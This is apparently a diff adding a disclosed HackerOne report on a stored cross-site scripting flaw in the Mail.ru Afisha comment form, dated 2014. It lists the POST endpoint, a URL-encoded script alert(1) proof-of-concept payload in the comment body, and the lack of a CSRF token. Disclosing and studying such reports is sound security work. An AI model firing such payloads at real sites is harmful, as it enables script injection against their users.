@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/10154
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/4p00rv
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:28.05.2014 13:37:47
+
+Summary:
+
+Adding a comment to article, this makes javascript execution possible.
+
+POST: http://afisha.mail.ru/ext/add_comment/
+
+Post Content
+
+alias=article&id=42797&pid=&count=20&comment_body=%5Btesting%5D+%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ok=%D0%94%D0%BE%D0%B1%D0%B0%D0%B2%D0%B8%D1%82%D1%8C
+
+also there is no csrf token
